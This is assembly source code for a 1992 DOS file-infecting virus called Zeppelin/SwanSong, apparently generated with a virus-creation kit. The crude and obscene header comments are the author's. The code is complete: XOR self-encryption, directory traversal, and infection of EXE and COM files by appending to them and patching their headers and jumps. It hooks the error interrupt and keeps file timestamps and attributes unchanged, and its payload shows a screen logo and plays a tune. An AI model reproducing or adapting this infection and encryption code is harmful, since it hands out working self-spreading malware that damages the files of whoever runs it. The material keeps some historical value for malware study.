;**************************************************************************
;
;The Zeppelin Virus  September 25, 1992
;[MPC] Generated...
;Created by... pAgE
;As a TRiBuTe to John "back-beat" Bohnam, this "WEAK-DICK" ViRUS was made!
;Incidently. He died on this date in 1980! Got drunk and strangled on a
;CunT hAiR...oR wAs iT a tAmPoN???...Oh well, So goes RocK -n- RoLL...
;By the wAy<---That's whAt you sAy just beforE you bOrE the FuCK out of
;soMeoNe with anOthEr TRiViAl piEce of SHiT!!! These LiTTLe Up AnD LeTTeRS
;ThAt yA'll uSe, ArE a KicK....
;
;Okay, enough anti-social, suicidal, satan, sputum...On with the ViRUS...
;                          GeT'S in ThE bl00d DoEsn't it?------->^^^^^
;
;Here it is...
;It's not much, but in the hands off a knowledgeable Vx WRiTeR.......
;I'll keep workin' on it and see what I can do. In the mean time, have fun!
;I ReM'd out a lot of the ShIt iN here, So Joe LuNChmEaT doesn;t FrY hImSelF.
;
;But...If that's not good enough, well then - hEy! - BLoW mE!
;
;***************************************************************************

.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

id = 'IS'                               ; ID word for EXE infections
entry_point: db 0e9h,0,0                ; jmp decrypt

decrypt:                                ; handles encryption and decryption
patch_startencrypt:
          mov  di,offset startencrypt   ; start of decryption
          mov  si,(offset heap - offset startencrypt)/2 ; iterations
decrypt_loop:
          db   2eh,81h,35h              ; xor word ptr cs:[di], xxxx
decrypt_value dw 0                      ; initialised at zero for null effect
          inc  di                       ; calculate new decryption location
          inc  di
          dec  si                       ; If we are not done, then
          jnz  decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:
          pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset


          cmp  sp,id                    ; COM or EXE?
          je   restoreEXE
restoreCOM:
          lea  si,[bp+save3]
          mov  di,100h
          push di                       ; For later return
          movsb
          jmp  short restoreEXIT
restoreEXE:
          push ds
          push es
          push cs                       ; DS = CS
          pop  ds
          push cs                       ; ES = CS
          pop  es
          lea  si,[bp+jmpsave2]
          lea  di,[bp+jmpsave]
          movsw
          movsw
          movsw
restoreEXIT:
          movsw

          mov  byte ptr [bp+numinfec],5 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
          int  21h

          mov  ah,47h                   ; Get current directory
          mov  dl,0                     ; Current drive
          lea  si,[bp+origdir]          ; DS:SI->buffer
          int  21h
          mov  byte ptr [bp+backslash],'\' ; Prepare for later CHDIR

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+exe_mask]
          call infect_mask
          lea  dx,[bp+com_mask]
          call infect_mask
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+dot_dot]          ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
         ;mov  ah,2ah                   ; Get current date
         ;int  21h
         ;cmp  dh,9                     ; Check month
         ;jb   act_two
         ;cmp  dl,25                    ; Check date
         ;jb   act_two
         ;cmp  cx,1992                  ; Check year
         ;jb   act_two
         ;cmp  al,0                     ; Check date of week
         ;jb   activate

         ;mov  ah,2ch                   ; Get current time
         ;int  21h
         ;cmp  dl,50                    ; Check the percentage
          jbe  activate

exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,3bh                   ; change directory
          lea  dx,[bp+origdir-1]        ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          cmp  sp,id-4                  ; EXE or COM?
          jz   returnEXE
returnCOM:
          int  27h
          retn                          ; 100h is on stack
returnEXE:
          pop  es
          pop  ds
          int  21h
          mov  ax,es                    ; AX = PSP segment
          add  ax,10h                   ; Adjust for PSP
          add  word ptr cs:[bp+jmpsave+2],ax
          add  ax,word ptr cs:[bp+stacksave+2]
          cli                           ; Clear intrpts for stack manipulation
          mov  sp,word ptr cs:[bp+stacksave]
          mov  ss,ax
          sti
          db   0eah                     ; jmp ssss:oooo
jmpsave             dd ?                ; Original CS:IP
stacksave           dd ?                ; Original SS:SP
jmpsave2            db ?                ; Actually four bytes
save3               db 0cdh,20h,0       ; First 3 bytes of COM file
exe_mask            db '*.exe',0
com_mask            db '*.com',0
stacksave2          dd ?

activate        proc    far

start:
		jmp	short loc_1
		db	90h
data_2		db	0
data_3		dw	216h
		db	2
data_4		dw	0
                db      'Ripped this Motherfucker off'
		db	1Ah
data_5          db      'SHIT!!! Wont work....', 0Dh, 0Ah
		db	'$'
loc_1:

                mov     ax,0003h           ; stick 3 into ax.
                int     10h                ; Set up 80*25, text mode.  Clear the screen, too.
                mov     ah,0Fh
		int	10h			; Video display   ah=functn 0Fh
						;  get state, al=mode, bh=page
						;   ah=columns on screen
		mov	bx,0B800h
		cmp	al,2
		je	loc_2			; Jump if equal
		cmp	al,3
		je	loc_2			; Jump if equal
		mov	data_2,0
		mov	bx,0B000h
		cmp	al,7
		je	loc_2			; Jump if equal
		mov	dx,offset data_5	; ('Unsupported Video Mode')
		mov	ah,9
		int	21h			; DOS Services  ah=function 09h
						;  display char string at ds:dx
		retn
loc_2:
		mov	es,bx
		mov	di,data_4
		mov	si,offset data_6
		mov	dx,3DAh
		mov	bl,9
		mov	cx,data_3
		cld				; Clear direction
		xor	ax,ax			; Zero register

locloop_4:
		lodsb				; String [si] to al
		cmp	al,1Bh
		jne	loc_5			; Jump if not equal
		xor	ah,80h
		jmp	short loc_20
loc_5:
		cmp	al,10h
		jae	loc_8			; Jump if above or =
		and	ah,0F0h
		or	ah,al
		jmp	short loc_20
loc_8:
		cmp	al,18h
		je	loc_11			; Jump if equal
		jnc	loc_12			; Jump if carry=0
		sub	al,10h
		add	al,al
		add	al,al
		add	al,al
		add	al,al
		and	ah,8Fh
		or	ah,al
		jmp	short loc_20
loc_11:
		mov	di,data_4
		add	di,data_1e
		mov	data_4,di
		jmp	short loc_20
loc_12:
		mov	bp,cx
		mov	cx,1
		cmp	al,19h
		jne	loc_13			; Jump if not equal
		lodsb				; String [si] to al
		mov	cl,al
		mov	al,20h			; ' '
		dec	bp
		jmp	short loc_14
loc_13:
		cmp	al,1Ah
		jne	loc_15			; Jump if not equal
		lodsb				; String [si] to al
		dec	bp
		mov	cl,al
		lodsb				; String [si] to al
		dec	bp
loc_14:
		inc	cx
loc_15:
		cmp	data_2,0
		je	loc_18			; Jump if equal
		mov	bh,al

locloop_16:
		in	al,dx			; port 3DAh, CGA/EGA vid status
		rcr	al,1			; Rotate thru carry
		jc	locloop_16		; Jump if carry Set
loc_17:
		in	al,dx			; port 3DAh, CGA/EGA vid status
		and	al,bl
		jnz	loc_17			; Jump if not zero
		mov	al,bh
		stosw				; Store ax to es:[di]
		loop	locloop_16		; Loop if cx > 0

		jmp	short loc_19
loc_18:
		rep	stosw			; Rep when cx >0 Store ax to es:[di]
loc_19:
		mov	cx,bp
loc_20:
                jcxz    loc_new_25              ; Jump if cx=0
		loop	locloop_4		; Loop if cx > 0
loc_new_25:


                mov     si,offset data00        ; SI points to data
get_note:       mov     bx,[si]                 ; Load BX with the frequency
                or      bx,bx                   ; Is BX equal to zero?
                je      play_tune_done          ; If it is we are finished

                mov     ax,034DDh               ;
                mov     dx,0012h                ;
                cmp     dx,bx                   ;
                jnb     new_note                ;
                div     bx                      ; This bit here was stolen
                mov     bx,ax                   ; from the Turbo C++ v1.0
                in      al,061h                 ; library file CS.LIB.  I
                test    al,3                    ; extracted sound() from the
                jne     skip_an_or              ; library and linked it to
                or      al,3                    ; an .EXE file, then diassembled
                out     061h,al                 ; it.  Basically this turns
                mov     al,0B6h                 ; on the speaker at a certain
                out     043h,al                 ; frequency.
skip_an_or:     mov     al,bl                   ;
                out     042h,al                 ;
                mov     al,bh                   ;
                out     042h,al                 ;

                mov     bx,[si + 2]             ; BX holds duration value
                xor     ah,ah                   ; BIOS get time function
                int     1Ah
                add     bx,dx                   ; Add the time to the length
wait_loop:      int     1Ah                     ; Get the time again (AH = 0)
                cmp     dx,bx                   ; Is the delay over?
                jne     wait_loop               ; Repeat until it is
                in      al,061h                 ; Stolen from the nosound()
                and     al,0FCh                 ; procedure in Turbo C++ v1.0.
                out     061h,al                 ; This turns off the speaker.

new_note:       add     si,4                    ; SI points to next note
                jmp     short get_note          ; Repeat with the next note
play_tune_done:
activate        endp

          jmp  exit_virus

creator             db '[pAgE]',0        ; YOU REALLY SHOULD TAKE THIS
virusname           db '[SwanSong]',0    ; BULLSHIT OUT OF HERE!!!
author              db 'pAgE',0      ; WHY NOT HOLD UP A SIGN!!!

infect_mask:
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   exit_infect_mask         ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,20h                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          cmp  word ptr [bp+buffer],'ZM'; EXE?
          jz   checkEXE                 ; Why yes, yes it is!
checkCOM:
          mov  ax,word ptr [bp+newDTA+1ah] ; Filesize in DTA
          cmp  ax,(heap-decrypt)      ; Is it too small?
          jb   find_next

          mov  bx,word ptr [bp+buffer+1] ;get jmp location
          add  bx,(heap-decrypt+1)        ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
checkEXE: cmp  word ptr [bp+buffer+10h],id ; is it already infected?
          jnz  infect_exe
find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
exit_infect_mask: ret

infect_exe:
          les  ax, dword ptr [bp+buffer+14h] ; Save old entry point
          mov  word ptr [bp+jmpsave2], ax
          mov  word ptr [bp+jmpsave2+2], es

          les  ax, dword ptr [bp+buffer+0Eh] ; Save old stack
          mov  word ptr [bp+stacksave2], es
          mov  word ptr [bp+stacksave2+2], ax

          mov  ax, word ptr [bp+buffer + 8] ; Get header size
          mov  cl, 4                    ; convert to bytes
          shl  ax, cl
          xchg ax, bx

          les  ax, [bp+offset newDTA+26]; Get file size
          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr [bp+buffer+14h], dx ; New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ; and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ; get file length
          pop  ax

          add  ax,(heap-decrypt)         ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr [bp+buffer+4], dx ; new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ; restore ES
          pop  es

          push word ptr [bp+buffer+14h] ; needed later
          mov  cx, 1ah
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
          push ax                       ; needed later
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

get_encrypt_value:
          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          or  dx,dx                     ; Check if encryption value = 0
          jz  get_encrypt_value         ; Get another if it is
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+code_store]
          mov  ax,5355h                 ; push bp,push bx
          stosw
          lea  si,[bp+decrypt]          ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          lea    si,[bp+write]          ; Copy writing function
          mov    cx,endwrite-write      ; Bytes to move
          rep    movsb
          pop    cx
          pop    si
          pop    dx                     ; Entry point of virus
          push   di
          push   si
          push   cx
          rep    movsb                  ; Copy decryption function
          mov    ax,5b5dh               ; pop bx,pop bp
          stosw
          mov    al,0c3h                ; retn
          stosb

          add    dx,offset startencrypt - offset decrypt ; Calculate new
          mov    word ptr [bp+patch_startencrypt+1],dx ; starting offset of
          call   code_store             ; decryption
          pop    cx
          pop    di
          pop    si
          rep    movsb                  ; Restore decryption function

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          pop  ax                       ; remove call from stack
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

write:
          pop  bx                       ; Restore file handle
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+decrypt]          ; Concatenate virus
          mov  cx,(heap-decrypt)          ; # bytes to write
          int  21h
          push bx
          push bp
endwrite:

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control
data00    dw      2000,8,2500,8,2000,14,2500,14
         dw      2500,14,3000,4,4000,24,3500,12,4000,6
         dw      3500,12,4000,4,4500,10,5000,4
         dw      5500,15,3000,8,3500,20,3000,8,3500,50
         dw      2000,8,2500,8,2000,14,2500,14
         dw      2500,14,3000,4,4000,24,3500,12,4000,6
         dw      3500,12,4000,4,4500,10,5000,4
         dw      5500,15,3000,8,3500,20,3000,8,3500,50
         dw      2000,8,2500,8,2000,14,2500,14
         dw      2500,14,3000,4,4000,24,3500,12,4000,6
         dw      3500,12,4000,4,4500,10,5000,4
         dw      5500,15,3000,8,3500,20,3000,8,3500,50
          dw      0

data_6          db      9
		db	 10h, 19h, 45h, 18h, 19h, 1Bh
		db	 01h,0D5h,0CDh,0CDh,0B8h, 04h
		db	0F3h, 09h,0A9h, 04h, 9Dh
		db	9
		db	0AAh, 04h,0F2h, 01h,0D5h,0CDh
		db	0CDh,0B8h, 19h, 1Ch, 18h, 19h
		db	 12h,0D5h, 1Ah, 0Ah,0CDh,0BEh
		db	 20h, 09h, 5Ch, 04h,0F6h, 09h
		db	 2Fh, 20h, 01h,0D4h, 1Ah, 0Ah
		db	0CDh,0B8h, 19h, 13h, 18h, 19h
		db	 03h,0C9h, 1Ah, 0Dh,0CDh,0BEh
		db	 19h, 03h, 0Fh,0D2h,0B7h, 19h
		db	 04h,0D6h, 1Ah, 03h,0C4h,0B7h
		db	 20h,0D2h,0D2h,0C4h,0C4h,0C4h
		db	0B7h, 19h, 04h, 01h,0D4h, 1Ah
		db	 0Eh,0CDh,0BBh, 19h, 03h, 18h
		db	 19h, 03h,0BAh, 19h, 12h, 07h
		db	0BAh,0BAh, 19h, 04h,0BAh, 19h
		db	 03h,0BDh, 20h,0BAh,0BAh, 19h
		db	 02h,0D3h,0B7h, 19h, 13h, 01h
		db	0BAh, 19h, 03h, 18h, 19h, 03h
		db	0BAh, 19h, 07h, 0Bh, 1Ah, 02h
		db	 04h, 19h, 07h, 08h,0BAh,0B6h
		db	 19h, 04h,0C7h,0C4h,0B6h, 19h
		db	 03h,0BAh,0B6h, 19h, 03h,0BAh
		db	 19h, 07h, 0Bh, 1Ah, 02h, 04h
		db	 19h, 08h, 01h,0BAh, 19h, 03h
		db	 18h,0D6h,0C4h,0C4h, 20h,0BAh
		db	 19h, 12h, 08h,0BAh,0D3h, 19h
		db	 02h,0B7h, 20h,0BAh, 19h, 03h
		db	0B7h, 20h,0BAh,0D3h, 19h, 02h
		db	0D6h,0BDh, 19h, 13h, 01h,0BAh
		db	 20h,0C4h,0C4h,0B7h, 18h,0D3h
		db	0C4h,0C4h,0C4h,0BDh, 19h, 12h
		db	 08h,0D3h, 1Ah, 03h,0C4h,0BDh
		db	 20h,0D3h, 1Ah, 03h,0C4h,0BDh
		db	 20h,0D0h, 1Ah, 03h,0C4h,0BDh
		db	 19h, 14h, 01h,0D3h,0C4h,0C4h
		db	0C4h,0BDh, 18h, 04h, 1Ah, 04h
		db	 3Eh, 19h, 03h, 0Fh,0D6h, 1Ah
		db	 04h,0C4h,0B7h, 20h,0D6h, 1Ah
		db	 03h,0C4h,0B7h, 20h,0D2h,0D2h
		db	0C4h,0C4h,0C4h,0B7h, 20h,0D2h
		db	0D2h,0C4h,0C4h,0C4h,0B7h, 20h
		db	0D6h, 1Ah, 03h,0C4h,0B7h, 20h
		db	0D2h,0B7h, 19h, 04h,0D2h, 20h
		db	 20h,0D2h,0D2h,0C4h,0C4h,0C4h
		db	0B7h, 19h, 03h, 04h, 1Ah, 04h
		db	 3Ch, 18h, 01h,0D6h,0C4h,0C4h
		db	0C4h,0B7h, 19h, 07h, 07h,0D6h
		db	0C4h,0BDh
		dd	319BA20h		; Data table (indexed access)
		db	0BDh, 20h,0BAh,0BDh, 19h, 02h
		db	0BAh, 20h,0BAh,0BDh, 19h, 02h
		db	0BAh, 20h,0BAh, 19h, 03h,0BDh
		db	 20h,0BAh,0BAh, 19h, 04h,0BAh
		db	 20h, 20h,0BAh,0BAh, 19h, 02h
		db	0BAh, 19h, 03h, 01h,0D6h,0C4h
		db	0C4h,0C4h,0B7h, 18h,0D3h,0C4h
		db	0C4h, 20h,0BAh, 19h, 06h, 08h
		db	 58h, 19h, 03h,0C7h,0C4h,0B6h
		db	 19h, 03h,0BAh, 1Ah, 03h,0C4h
		db	0BDh, 20h,0BAh, 1Ah, 03h,0C4h
		db	0BDh, 20h,0C7h,0C4h,0B6h, 19h
		db	 03h,0BAh,0B6h, 19h, 04h,0BAh
		db	 20h, 20h,0BAh,0B6h, 19h, 02h
		db	0BAh, 19h, 03h, 01h,0BAh, 20h
		db	0C4h,0C4h,0BDh, 18h, 19h, 03h
		db	0BAh, 19h, 03h, 08h,0D6h,0C4h
		db	0BDh, 19h, 04h,0BAh, 19h, 03h
		db	0B7h, 20h,0BAh, 19h, 05h,0BAh
		db	 19h, 05h,0BAh, 19h, 03h,0B7h
		db	 20h,0BAh,0D3h, 19h, 02h,0B7h
		db	 20h,0BAh, 20h, 20h,0BAh,0D3h
		db	 19h, 02h,0BAh, 19h, 03h, 01h
		db	0BAh, 19h, 03h, 18h, 19h, 03h
		db	0BAh, 19h, 03h, 08h,0D3h, 1Ah
		db	 04h,0C4h,0BDh, 20h,0D3h, 1Ah
		db	 03h,0C4h,0BDh, 20h,0BDh, 19h
		db	 05h,0BDh, 19h, 05h,0D3h, 1Ah
		db	 03h,0C4h,0BDh, 20h,0D3h, 1Ah
		db	 03h,0C4h,0BDh, 20h,0D0h, 20h
		db	 20h,0D0h, 19h, 03h,0D0h, 19h
		db	 03h, 01h,0BAh, 19h, 03h, 18h
		db	 19h, 03h,0C8h, 1Ah, 15h,0CDh
		db	0B8h, 19h, 0Ch,0D5h, 1Ah, 16h
		db	0CDh,0BCh, 19h, 03h, 18h, 19h
		db	 1Ah,0D4h,0CDh, 04h, 1Ah, 03h
		db	0F7h, 09h, 2Fh, 04h,0EAh, 09h
		db	 5Ch, 04h, 1Ah, 03h,0F7h, 01h
		db	0CDh,0BEh, 19h, 1Bh, 18h

data_1e            equ     0A0h
dot_dot            db '..',0
heap:
; The following code is the buffer for the write function
code_store:         db (startencrypt-decrypt)*2+(endwrite-write)+1 dup (?)
oldint24            dd ?                ; Storage for old int 24h handler      
backslash           db ?
origdir             db 64 dup (?)       ; Current directory buffer             
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
finish          label   near
end       entry_point



; Yeah, the main problem is reproducing the effect in an infected file so
; thta when IT runs, IT too will display... That's the GLITCH...
;
; Also, I had stuck INT 27H in somewhere around the EXIT .EXE...
; I don't remember, but it would go resident and suck up memory, yet
; since it hooked no interuppts, it just sat there...
; Feel free to STUDY this code and distribute it feely for educational
; purposes, because in spite of the kidding...I don't "hAcK"... for lack
; of a better word...--->>pAgE<<---
